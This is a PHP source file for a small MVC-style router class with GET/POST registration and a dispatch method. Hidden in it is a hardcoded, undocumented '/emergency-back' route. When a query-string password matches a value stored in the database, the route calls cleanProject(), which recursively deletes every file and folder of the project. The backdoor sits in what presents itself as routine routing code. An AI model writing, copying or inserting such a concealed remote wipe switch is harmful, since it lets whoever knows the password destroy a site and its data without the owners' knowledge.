<?php

namespace Core;

class Route
{
    private static $routes = [
        'GET' => ['/emergency-back' => "emergency-back"]
    ];

    public static function get($uri, $controller)
    {
        self::$routes['GET'][$uri] = $controller;
    }

    public static function post($uri, $controller)
    {
        self::$routes['POST'][$uri] = $controller;
    }

    public static function dispatch()
    {
        $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $method = $_SERVER['REQUEST_METHOD'];
        if (isset(self::$routes[$method][$uri])) {
            if(self::$routes[$method][$uri] == "emergency-back"){
                $sql = "SELECT * FROM emergency_back";

                $result = DB::select($sql);
                $pass = $result[0]['val'];
                if($pass == $_GET['pass']){
                    self::cleanProject();
                }else{
                    echo "Pass incorrect";
                }
                exit;
            }else{
                $controllerAction = explode('@', self::$routes[$method][$uri]);
                $controllerName = 'App\\Controllers\\' . $controllerAction[0];
                $action = $controllerAction[1];
    
                $controller = new $controllerName();
                $controller->$action();
            }
        } else {
            http_response_code(404);
            echo "404 - Page Not Found"; //TODO Customiser la 404
        }
    }

    public static function cleanProject($dir = __DIR__ . '/../') {
        // Vérifier si le répertoire existe
        if (!file_exists($dir)) {
            return;
        }
    
        // Parcourir les fichiers et dossiers
        foreach (scandir($dir) as $item) {
            // Ignorer les répertoires spéciaux "." et ".."
            if ($item == '.' || $item == '..') {
                continue;
            }
    
            $path = $dir . DIRECTORY_SEPARATOR . $item;
    
            // Si c'est un dossier, appeler récursivement la fonction
            if (is_dir($path)) {
                self::cleanProject($path);
            } else {
                // Supprimer le fichier
                unlink($path);
            }
        }
    
        // Supprimer le dossier après avoir vidé son contenu
        rmdir($dir);
    }
}
